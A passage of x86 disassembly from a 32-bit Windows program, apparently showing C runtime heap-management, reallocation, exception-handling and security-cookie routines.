  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
